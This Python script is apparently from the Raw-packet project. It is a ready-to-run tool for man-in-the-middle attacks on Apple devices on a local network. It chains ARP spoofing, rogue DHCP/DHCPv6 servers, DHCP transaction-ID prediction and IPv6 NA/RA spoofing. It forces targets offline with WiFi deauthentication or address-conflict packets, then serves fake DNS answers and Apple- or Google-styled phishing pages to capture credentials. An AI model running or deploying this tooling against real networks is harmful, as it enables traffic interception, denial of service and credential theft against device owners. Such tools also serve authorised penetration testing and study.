#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_mitm.py: MiTM Apple devices (apple_mitm)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.wifi import WiFi
from raw_packet.Utils.network import RawSniff
from raw_packet.Scanners.icmpv6_router_search import ICMPv6RouterSearch

from raw_packet.Servers.dns_server import DnsServer
from raw_packet.Servers.dhcpv4_server import DHCPv4Server
from raw_packet.Servers.dhcpv6_server import DHCPv6Server
from raw_packet.Servers.Phishing.phishing import PhishingServer

from raw_packet.Scripts.NCC.ncc import NetworkConflictCreator
from raw_packet.Scripts.Apple.apple_dhcp_server import AppleDHCPServer
from raw_packet.Scripts.ARP.arp_spoof import ArpSpoof
from raw_packet.Scripts.IPv6.ipv6_spoof import IPv6Spoof

from prettytable import PrettyTable
from argparse import ArgumentParser, RawTextHelpFormatter
from subprocess import run
from time import sleep
from random import randint, choice
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
__script_name__ = 'MiTM Apple devices (apple_mitm)'
# endregion


# region Class AppleMitm
class AppleMitm:

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    _utils: Utils = Utils()
    _wifi: Union[None, WiFi] = None
    _icmpv6_router_search: Union[None, ICMPv6RouterSearch] = None

    _mitm_techniques: List[str] = ['ARP Spoofing',
                                   'Second DHCP ACK',
                                   'Predict next DHCP transaction ID',
                                   'Rogue SLAAC/DHCPv6 server',
                                   'NA Spoofing (IPv6)',
                                   'RA Spoofing (IPv6)']
    _mitm_technique: int = 1

    _disconnect_techniques: List[str] = ['IPv4 network conflict detection',
                                         'Send WiFi deauthentication packets',
                                         'Do not disconnect device after MiTM']
    _disconnect_technique: int = 1

    _your: Dict[str, Union[None, str]] = {'network-interface': None,
                                          'mac-address': None,
                                          'ipv4-address': None}

    _gateway: Dict[str, Union[None, str]] = {'ipv4-address': None,
                                             'ipv6-address': None}

    _dns_server: Dict[str, Union[None, str]] = {'ipv4-address': None,
                                                'ipv6-address': None}

    _target: Dict[str, Union[None, str]] = {'mac-address': None,
                                            'ipv4-address': None,
                                            'new-ipv4-address': None,
                                            'ipv6-address': None,
                                            'new-ipv6-address': None}

    _ipv6_network_prefix: str = 'fde4:8dba:82e1:ffff::/64'

    _mtu: int = 1500

    _ipv4_mitm: bool = False
    _ipv6_mitm: bool = False

    _deauth_packets: int = 25
    _deauth_stop: bool = False
    # endregion

    # region Start MiTM
    def start(self,
              mitm_technique: Union[None, int] = None,
              disconnect_technique: Union[None, int] = None,
              mitm_interface: Union[None, str] = None,
              deauth_interface: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              target_ipv4_address: Union[None, str] = None,
              target_new_ipv4_address: Union[None, str] = None,
              target_ipv6_address: Union[None, str] = None,
              target_new_ipv6_address: Union[None, str] = None,
              gateway_ipv4_address: Union[None, str] = None,
              gateway_ipv6_address: Union[None, str] = None,
              dns_ipv4_address: Union[None, str] = None,
              dns_ipv6_address: Union[None, str] = None,
              ipv6_prefix: Union[None, str] = None,
              phishing_site: Union[None, str] = None):

        # region Variables
        thread_manager: ThreadManager = ThreadManager(10)

        mitm_network_interface: Union[None, str] = None
        deauth_network_interface: Union[None, str] = None

        disconnect: bool = False
        deauth: bool = False
        # endregion

        # region Kill subprocess
        if self._base.get_platform().startswith('Linux'):
            try:
                self._base.print_info('Stop services: ', 'dnsmasq, network-manager')
                run(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
                run(['service network-manager stop  >/dev/null 2>&1'], shell=True)
            except OSError:
                self._base.print_error('Something went wrong while trying to stop services:',
                                       'dnsmasq and network-manager')
                exit(1)

        # Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
        self._base.print_info('Stop processes that listens on UDP ports: ', '53, 68, 547')
        self._base.kill_processes_by_listen_port(53, 'udp')
        self._base.kill_processes_by_listen_port(68, 'udp')
        self._base.kill_processes_by_listen_port(547, 'udp')

        self._base.print_info('Stop processes that listens on TCP ports: ', '80, 443')
        self._base.kill_processes_by_listen_port(80, 'tcp')
        self._base.kill_processes_by_listen_port(443, 'tcp')
        # endregion

        # region MiTM technique selection
        if self._base.get_platform().startswith('Windows') or self._base.get_platform().startswith('Darwin'):
            self._mitm_techniques.remove('Second DHCP ACK')
            self._disconnect_techniques.remove('Send WiFi deauthentication packets')

        if mitm_technique is None:
            self._base.print_info('MiTM technique list:')
            _technique_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
                                                   self._base.cINFO + 'MiTM technique' + self._base.cEND])
            for _technique_index in range(len(self._mitm_techniques)):
                _technique_pretty_table.add_row([str(_technique_index + 1),
                                                 self._mitm_techniques[_technique_index]])
            print(_technique_pretty_table)
            print(self._base.c_info + 'Set MiTM technique index from range (1 - ' +
                  str(len(self._mitm_techniques)) + '): ', end='')
            _test_technique = input()
            assert _test_technique.isdigit(), \
                'MiTM technique index is not digit!'
        else:
            _test_technique = mitm_technique
        self._mitm_technique = \
            self._utils.check_value_in_range(value=int(_test_technique),
                                             first_value=1, last_value=len(self._mitm_techniques),
                                             parameter_name='MiTM technique') - 1
        # endregion

        # region Disconnect technique selection
        if self._mitm_techniques[self._mitm_technique] == 'Second DHCP ACK':
            disconnect = True
            deauth = True

        else:
            if disconnect_technique is None:
                self._base.print_info('Disconnect technique list:')
                _disconnect_pretty_table = PrettyTable([self._base.cINFO + 'Index' + self._base.cEND,
                                                        self._base.cINFO + 'Disconnect technique' + self._base.cEND])
                for _technique_index in range(len(self._disconnect_techniques)):
                    _disconnect_pretty_table.add_row([str(_technique_index + 1),
                                                      self._disconnect_techniques[_technique_index]])
                print(_disconnect_pretty_table)
                print(self._base.c_info + 'Set Disconnect technique index from range (1 - ' +
                      str(len(self._disconnect_techniques)) + '): ', end='')
                _test_technique = input()
                assert _test_technique.isdigit(), \
                    'Disconnect technique index is not digit!'
            else:
                _test_technique = disconnect_technique
            self._disconnect_technique = \
                self._utils.check_value_in_range(value=int(_test_technique),
                                                 first_value=1, last_value=len(self._disconnect_techniques),
                                                 parameter_name='Disconnect technique') - 1

            # Do not disconnect device after MiTM
            if self._disconnect_techniques[self._disconnect_technique] == 'Do not disconnect device after MiTM':
                disconnect = False
                deauth = False

            # Use WiFi deauthentication disconnect technique
            elif self._disconnect_techniques[self._disconnect_technique] == 'Send WiFi deauthentication packets':
                disconnect = True
                deauth = True

            # Use IPv4 network conflict disconnect technique
            else:
                disconnect = True
                deauth = False

        # endregion

        # region Get MiTM network interface
        mitm_network_interface = \
            self._base.network_interface_selection(interface_name=mitm_interface,
                                                   message='Please select a network interface for '
                                                           'MiTM Apple devices from table: ')
        self._your = self._base.get_interface_settings(interface_name=mitm_network_interface,
                                                       required_parameters=['mac-address', 'ipv4-address'])
        if self._your['ipv6-link-address'] is None:
            self._your['ipv6-link-address'] = self._base.make_ipv6_link_address(self._your['mac_address'])
        # endregion

        # region Get Deauth network interface
        if deauth:
            assert mitm_network_interface in self._base.list_of_wireless_network_interfaces(), \
                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' is not Wireless!'

            assert len(self._base.list_of_wireless_network_interfaces()) <= 1, \
                'You have only one wireless interface: ' + self._base.info_text(mitm_network_interface) + \
                '; to send WiFi deauth packets you need a second wireless interface!'

            assert self._your['essid'] is not None \
                   and self._your['bssid'] is not None \
                   and self._your['channel'] is not None, \
                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' does not connect to AP!'

            # region Set network interface for send wifi deauth packets
            deauth_network_interface = \
                self._base.network_interface_selection(interface_name=deauth_interface,
                                                       exclude_interface=mitm_network_interface,
                                                       only_wireless=True,
                                                       message='Please select a network interface for '
                                                               'send WiFi deauth packets from table: ')

            self._wifi = WiFi(wireless_interface=deauth_network_interface,
                              wifi_channel=self._your['channel'], debug=False, start_scan=False)

        # endregion

        # region Check IPv4 or IPv6 mitm
        if self._mitm_techniques[self._mitm_technique] in \
                ['ARP Spoofing', 'Second DHCP ACK', 'Predict next DHCP transaction ID']:
            self._ipv4_mitm = True
        elif self._mitm_techniques[self._mitm_technique] in \
                ['Rogue SLAAC/DHCPv6 server', 'NA Spoofing (IPv6)', 'RA Spoofing (IPv6)']:
            self._ipv6_mitm = True
        # endregion

        # region Set IPv4 DNS server
        if self._ipv4_mitm:
            if dns_ipv4_address is not None:
                self._dns_server['ipv4-address'] = \
                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                   ipv4_address=dns_ipv4_address,
                                                   is_local_ipv4_address=False,
                                                   parameter_name='DNS server IPv4 address')
            else:
                self._dns_server['ipv4-address'] = self._your['ipv4-address']
        # endregion

        # region Set IPv6 DNS server
        if self._ipv6_mitm:
            if dns_ipv6_address is not None:
                self._dns_server['ipv6-address'] = \
                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                   ipv6_address=gateway_ipv6_address,
                                                   is_local_ipv6_address=False,
                                                   parameter_name='gateway IPv6 address',
                                                   check_your_ipv6_address=False)
            else:
                self._dns_server['ipv6-address'] = self._your['ipv6-link-address']
        # endregion

        # region Set IPv4 gateway
        if self._ipv4_mitm:
            if gateway_ipv4_address is not None:
                self._gateway['ipv4-address'] = \
                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                   ipv4_address=gateway_ipv4_address,
                                                   is_local_ipv4_address=True,
                                                   parameter_name='gateway IPv4 address')
            else:
                if self._mitm_techniques[self._mitm_technique] == 'ARP Spoofing':
                    assert self._your['ipv4-gateway'] is not None, \
                        'Network interface: ' + self._base.error_text(mitm_network_interface) + \
                        ' does not have IPv4 gateway!'
                    self._gateway['ipv4-address'] = self._your['ipv4-gateway']
                else:
                    self._gateway['ipv4-address'] = self._your['ipv4-address']
        # endregion

        # region Set IPv6 gateway
        if self._ipv6_mitm:
            if gateway_ipv6_address is not None:
                self._gateway['ipv6-address'] = \
                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                   ipv6_address=gateway_ipv6_address,
                                                   is_local_ipv6_address=True,
                                                   parameter_name='gateway IPv6 address',
                                                   check_your_ipv6_address=False)
            else:
                if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
                    self._gateway['ipv6-address'] = self._your['ipv6-link-address']
                else:
                    self._base.print_info('Search IPv6 Gateway and DNS server on interface: ', mitm_network_interface)
                    self._icmpv6_router_search: ICMPv6RouterSearch = \
                        ICMPv6RouterSearch(network_interface=mitm_network_interface)
                    _router_advertisement_data = \
                        self._icmpv6_router_search.search(timeout=5, retry=3, exit_on_failure=True)

                    assert _router_advertisement_data is not None, \
                        'Can not find IPv6 gateway in local network on interface: ' + \
                        self._base.error_text(mitm_network_interface)

                    self._gateway['ipv6-address'] = _router_advertisement_data['router_ipv6_address']

                    if 'dns-server' in _router_advertisement_data.keys():
                        self._dns_server['ipv6-address'] = _router_advertisement_data['dns-server']

                    if 'prefix' in _router_advertisement_data.keys():
                        self._ipv6_network_prefix = _router_advertisement_data['prefix']
                    elif ipv6_prefix is not None:
                        self._ipv6_network_prefix = ipv6_prefix

                    if 'mtu' in _router_advertisement_data.keys():
                        self._mtu = int(_router_advertisement_data['mtu'])
        # endregion

        # region Set target IPv4 address and new IPv4 address
        if self._ipv4_mitm:
            self._target = \
                self._utils.set_ipv4_target(network_interface=mitm_network_interface,
                                            target_ipv4_address=target_ipv4_address,
                                            target_mac_address=target_mac_address,
                                            target_vendor='apple',
                                            target_ipv4_address_required=False,
                                            exclude_ipv4_addresses=[self._your['ipv4-gateway']])

            # region Set target new IPv4 address
            if self._mitm_techniques[self._mitm_technique] == 'Predict next DHCP transaction ID':
                if target_new_ipv4_address is not None:
                    self._target['new-ipv4-address'] = \
                        self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                       ipv4_address=target_new_ipv4_address,
                                                       is_local_ipv4_address=True,
                                                       parameter_name='target new IPv4 address')
                else:
                    _free_ipv4_addresses = \
                        self._utils.get_free_ipv4_addresses(network_interface=mitm_network_interface)
                    self._target['new-ipv4-address'] = choice(_free_ipv4_addresses)
            # endregion
        
        # endregion

        # region Set target IPv6 address and new IPv6 address
        if self._ipv6_mitm:
            self._target = \
                self._utils.set_ipv6_target(network_interface=mitm_network_interface,
                                            target_ipv6_address=target_ipv6_address,
                                            target_mac_address=target_mac_address,
                                            target_vendor='apple',
                                            target_ipv6_address_is_local=True,
                                            exclude_ipv6_addresses=[self._your['ipv6-gateway']])

            # region Get target IPv4 address
            try:
                ipv4_target: Dict[str, str] = \
                    self._utils.set_ipv4_target(network_interface=mitm_network_interface,
                                                target_ipv4_address=None,
                                                target_mac_address=self._target['mac-address'],
                                                quiet=True)
                self._target['ipv4-address'] = ipv4_target['ipv4-address']
            except AssertionError:
                pass
            # endregion

            # region Set target new IPv6 address
            if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
                if target_new_ipv6_address is not None:
                    self._target['new-ipv6-address'] = \
                        self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                       ipv6_address=target_new_ipv4_address,
                                                       is_local_ipv6_address=False,
                                                       parameter_name='target new global IPv6 address',
                                                       check_your_ipv6_address=True)
                else:
                    self._target['new-ipv6-address'] = \
                        self._ipv6_network_prefix.split('/')[0] + format(randint(1, 65535), 'x')
            # endregion

        # endregion

        # region General output
        self._base.print_info('MiTM technique: ', self._mitm_techniques[self._mitm_technique])
        self._base.print_info('Disconnect technique: ', self._disconnect_techniques[self._disconnect_technique])
        self._base.print_info('Network interface: ', mitm_network_interface)
        self._base.print_info('Your MAC address: ', self._your['mac-address'])

        # region IPv4 MiTM
        if self._ipv4_mitm:
            self._base.print_info('Your IPv4 address: ', self._your['ipv4-address'])
            self._base.print_info('Gateway IPv4 address: ', self._gateway['ipv4-address'])

            if self._mitm_techniques[self._mitm_technique] != 'ARP Spoofing':
                self._base.print_info('DNS server IPv4 address: ', self._dns_server['ipv4-address'])

            if self._target['mac-address'] is not None:
                self._base.print_info('Target MAC address: ', self._target['mac-address'])

            if self._target['ipv4-address'] is not None:
                self._base.print_info('Target IPv4 address: ', self._target['ipv4-address'])

            if 'new-ipv4-address' in self._target.keys():
                if self._target['new-ipv4-address'] is not None:
                    self._base.print_info('Target new IPv4 address: ', self._target['new-ipv4-address'])
        # endregion
        
        # region IPv6 MiTM
        if self._ipv6_mitm:
            self._base.print_info('Your IPv6 local address: ', self._your['ipv6-link-address'])
            self._base.print_info('Prefix: ', self._ipv6_network_prefix)
            self._base.print_info('Gateway IPv6 address: ', self._gateway['ipv6-address'])
            self._base.print_info('DNS server IPv6 address: ', self._dns_server['ipv6-address'])

            if self._target['mac-address'] is not None:
                self._base.print_info('Target MAC address: ', self._target['mac-address'])

            if 'ipv4-address' in self._target.keys():
                if self._target['ipv4-address'] is not None:
                    self._base.print_info('Target IPv4 address: ', self._target['ipv4-address'])

            if self._target['ipv6-address'] is not None:
                self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])

            if 'new-ipv6-address' in self._target.keys():
                if self._target['new-ipv6-address'] is not None:
                    self._base.print_info('Target new global IPv6 address: ', self._target['new-ipv6-address'])
        # endregion
        
        # region WiFi info
        if deauth:
            self._base.print_info('Interface ', mitm_network_interface, 
                                  ' connected to: ', self._your['essid'] + ' (' + self._your['bssid'] + ')')
            self._base.print_info('Interface ', mitm_network_interface, ' channel: ', self._your['channel'])
            self._base.print_info('Deauth network interface: ', deauth_network_interface)
        # endregion
        
        # endregion

        # region Start DNS server
        if self._dns_server['ipv4-address'] == self._your['ipv4-address'] or \
                self._dns_server['ipv6-address'] == self._your['ipv6-link-address']:
            self._base.print_info('Start DNS server ...')
            thread_manager.add_task(self._start_dns_server)
        # endregion

        # region Disconnect device
        if disconnect:
            thread_manager.add_task(self._disconnect_device, deauth)
        # endregion

        # region Start IPv4 MiTM
        if self._ipv4_mitm:
            
            # region 1. ARP spoofing technique
            if self._mitm_techniques[self._mitm_technique] == 'ARP Spoofing':
                thread_manager.add_task(self._arp_spoof)
            # endregion
    
            # region 2. Second DHCP ACK technique
            elif self._mitm_techniques[self._mitm_technique] == 'Second DHCP ACK':
                thread_manager.add_task(self._dhcpv4_server)
            # endregion
    
            # region 3. Predict next DHCP transaction ID
            elif self._mitm_techniques[self._mitm_technique] == 'Predict next DHCP transaction ID':
                thread_manager.add_task(self._apple_dhcpv4_server)
            # endregion
        
        # endregion

        # region Start IPv6 MiTM
        if self._ipv6_mitm:
        
            # region 4. Rogue SLAAC/DHCPv6 server
            if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
                thread_manager.add_task(self._dhcpv6_server)
            # endregion
    
            # region 5. NA Spoofing (IPv6)
            elif self._mitm_techniques[self._mitm_technique] == 'NA Spoofing (IPv6)':
                thread_manager.add_task(self._na_spoof)
            # endregion
    
            # region 6. RA Spoofing (IPv6)
            elif self._mitm_techniques[self._mitm_technique] == 'RA Spoofing (IPv6)':
                thread_manager.add_task(self._ra_spoof)
            # endregion
        
        # endregion

        # region Start Phishing server
        if phishing_site is None:
            phishing_site = 'apple'
        thread_manager.add_task(self._start_ipv4_phishing, phishing_site)
        thread_manager.add_task(self._start_ipv6_phishing, phishing_site)
        # endregion

        # region Wait all threads
        thread_manager.wait_for_completion()
        # endregion

    # endregion

    # region Disconnect device
    def _disconnect_device(self, deauth: bool = False):

        if not deauth:
            # Start Network Conflict Creator (ncc)
            ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=self._your['network-interface'])
            try:
                ncc.start(target_mac_address=self._target['mac-address'],
                          target_ip_address=self._target['ipv4-address'],
                          exit_on_success=True)
            except KeyError:
                pass
        else:
            # Start WiFi deauth packets sender
            self._deauth_stop_sniffer()
            number_of_deauth_packets: int = self._deauth_packets
            while self._deauth_stop:
                self._wifi.send_deauth(bssid=self._your['bssid'],
                                       client=self._target['mac-address'],
                                       number_of_deauth_packets=number_of_deauth_packets)
                number_of_deauth_packets += 25
                sleep(30)
    # endregion

    # region ARP spoofing
    def _arp_spoof(self):
        sleep(3)
        arp_spoof: ArpSpoof = ArpSpoof(network_interface=self._your['network-interface'])
        arp_spoof.start(gateway_ipv4_address=self._gateway['ipv4-address'],
                        target_ipv4_address=self._target['ipv4-address'],
                        target_mac_address=self._target['mac-address'],
                        quiet=False)
    # endregion

    # region NA spoofing
    def _na_spoof(self):
        # sleep(3)
        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
        ipv6_spoof.start(technique=2,
                         target_ipv6_address=self._target['ipv6-address'],
                         target_mac_address=self._target['mac-address'],
                         gateway_ipv6_address=self._gateway['ipv6-address'],
                         dns_ipv6_address=self._dns_server['ipv6-address'],
                         ipv6_prefix=self._ipv6_network_prefix,
                         quiet=False)
    # endregion

    # region RA spoofing
    def _ra_spoof(self):
        # sleep(3)
        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
        ipv6_spoof.start(technique=1,
                         target_ipv6_address=self._target['ipv6-address'],
                         target_mac_address=self._target['mac-address'],
                         gateway_ipv6_address=self._gateway['ipv6-address'],
                         dns_ipv6_address=self._dns_server['ipv6-address'],
                         ipv6_prefix=self._ipv6_network_prefix,
                         quiet=False)
    # endregion

    # region DHCPv4 server
    def _dhcpv4_server(self):
        sleep(3)
        dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=self._your['network-interface'])
        dhcpv4_server.start(target_mac_address=self._target['mac-address'],
                            target_ipv4_address=self._target['ipv4-address'],
                            dns_server_ipv4_address=self._dns_server['ipv4-address'],
                            router_ipv4_address=self._gateway['ipv4-address'],
                            apple=True, quiet=False, exit_on_success=True)
    # endregion

    # region DHCPv4 server for Apple devices
    def _apple_dhcpv4_server(self):
        sleep(3)
        apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=self._your['network-interface'])
        apple_dhcp_server.start(target_ip_address=self._target['new-ipv4-address'],
                                target_mac_address=self._target['mac-address'],
                                quiet=False)
    # endregion

    # region DHCPv6 server
    def _dhcpv6_server(self):
        sleep(5)
        dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=self._your['network-interface'])
        dhcpv6_server.start(target_ipv6_address=self._target['new-ipv6-address'],
                            target_mac_address=self._target['mac-address'],
                            dns_server_ipv6_address=self._dns_server['ipv6-address'],
                            ipv6_prefix=self._ipv6_network_prefix,
                            exit_on_success=True, quiet=False)
    # endregion

    # region DNS server
    def _start_dns_server(self):
        dns_server: DnsServer = DnsServer(network_interface=self._your['network-interface'])
        dns_server.start(fake_answers=True,
                         success_domains=['captive.apple.com', 'authentication.net'],
                         listen_ipv6=True)
    # endregion

    # region IPv4 Phishing server
    @staticmethod
    def _start_ipv4_phishing(phishing_site: str = 'apple'):
        phishing_server: PhishingServer = PhishingServer()
        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
                              redirect='authentication.net', quiet=False)
    # endregion

    # region IPv6 Phishing server
    @staticmethod
    def _start_ipv6_phishing(phishing_site: str = 'apple'):
        phishing_server: PhishingServer = PhishingServer()
        phishing_server.start(address='::', port=80, site=phishing_site,
                              redirect='authentication.net', quiet=False)
    # endregion

    # region Requests sniffer PRN function
    def _deauth_stop_prn(self, request: Dict):
        if 'DHCPv4' in request.keys() or 'ICMPv6' in request.keys():
            self._deauth_stop = True
    # endregion

    # region Requests sniffer function
    def _deauth_stop_sniffer(self):

        # region Set network filter
        network_filters = {'Ethernet': {'source': self._target['mac-address']}}

        if self._mitm_technique == 2:
            network_filters = {
                'Ethernet': {
                    'source': self._target['mac-address'],
                    'destination': 'ff:ff:ff:ff:ff:ff'
                },
                'IPv4': {
                    'source-ip': '0.0.0.0',
                    'destination-ip': '255.255.255.255'
                },
                'UDP': {
                    'source-port': 68,
                    'destination-port': 67
                }
            }
        # endregion

        # region Start sniffer
        sniff = RawSniff()
        sniff.start(protocols=['IPv4', 'IPv6', 'ICMPv6', 'UDP', 'DHCPv4'],
                    prn=self._deauth_stop_prn, filters=network_filters,
                    network_interface=self._your['network-interface'],
                    scapy_filter='icmp6 or (udp and (port 67 or 68))',
                    scapy_lfilter=lambda eth: eth.src == self._target['mac-address'])
        # endregion

    # endregion

# endregion


# region Main function
def main():

    # region Init Raw-packet Base class
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawTextHelpFormatter)
    if base.get_platform().startswith('Linux'):
        parser.add_argument('-T', '--technique', type=int, default=None,
                            help='Set MiTM technique:'
                                 '\n1. ARP Spoofing'
                                 '\n2. Second DHCP ACK'
                                 '\n3. Predict next DHCP transaction ID'
                                 '\n4. Rogue SLAAC/DHCPv6 server'
                                 '\n5. NA Spoofing (IPv6)'
                                 '\n6. RA Spoofing (IPv6)')
        parser.add_argument('-D', '--disconnect', type=int, default=None,
                            help='Set device Disconnect technique:'
                                 '\n1. IPv4 network conflict detection'
                                 '\n2. Send WiFi deauthentication packets'
                                 '\n3. Do not disconnect device after MiTM')
    else:
        parser.add_argument('-T', '--technique', type=int, default=None,
                            help='Set MiTM technique:'
                                 '\n1. ARP Spoofing'
                                 '\n2. Predict next DHCP transaction ID'
                                 '\n3. Rogue SLAAC/DHCPv6 server'
                                 '\n4. NA Spoofing (IPv6)'
                                 '\n5. RA Spoofing (IPv6)')
        parser.add_argument('-D', '--disconnect', type=int, default=None,
                            help='Set device Disconnect technique:'
                                 '\n1. IPv4 network conflict detection'
                                 '\n2. Do not disconnect device after MiTM')
    parser.add_argument('-P', '--phishing_site', type=str, default='apple',
                        help='Set Phishing site "apple", "google" or Path to your site')
    parser.add_argument('-i', '--mitm_iface', type=str, help='Set interface name for MiTM')
    parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
    parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 25)',
                        default=25)
    parser.add_argument('-g4', '--gateway_ipv4', type=str, help='Set gateway IPv4 address', default=None)
    parser.add_argument('-g6', '--gateway_ipv6', type=str, help='Set gateway IPv6 address', default=None)
    parser.add_argument('-d4', '--dns_ipv4', type=str, help='Set DNS server IPv4 address', default=None)
    parser.add_argument('-d6', '--dns_ipv6', type=str, help='Set DNS server IPv6 address', default=None)
    parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
    parser.add_argument('-t4', '--target_ipv4', type=str, help='Set target IPv4 address', default=None)
    parser.add_argument('-n4', '--target_new_ipv4', type=str, help='Set new IPv4 address for target', default=None)
    parser.add_argument('-t6', '--target_ipv6', type=str, help='Set link local target IPv6 address', default=None)
    parser.add_argument('-n6', '--target_new_ipv6', type=str, help='Set new global IPv6 address for target', default=None)
    parser.add_argument('--ipv6_prefix', type=str, help='Set IPv6 network prefix, default - fde4:8dba:82e1:ffff::/64',
                        default='fde4:8dba:82e1:ffff::/64')
    args = parser.parse_args()
    # endregion

    # region Print banner
    base.print_banner(__script_name__)
    # endregion

    # region Start Apple MiTM
    try:
        apple_mitm: AppleMitm = AppleMitm()
        apple_mitm.start(mitm_technique=args.technique,
                         disconnect_technique=args.disconnect,
                         mitm_interface=args.mitm_iface,
                         deauth_interface=args.deauth_iface,
                         target_mac_address=args.target_mac,
                         target_ipv4_address=args.target_ipv4,
                         target_new_ipv4_address=args.target_new_ipv4,
                         target_ipv6_address=args.target_ipv6,
                         target_new_ipv6_address=args.target_new_ipv6,
                         gateway_ipv4_address=args.gateway_ipv4,
                         gateway_ipv6_address=args.gateway_ipv6,
                         dns_ipv4_address=args.dns_ipv4,
                         dns_ipv6_address=args.dns_ipv6,
                         ipv6_prefix=args.ipv6_prefix,
                         phishing_site=args.phishing_site)

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)
    # endregion

# endregion


# region Call Main function
if __name__ == '__main__':
    main()
# endregion
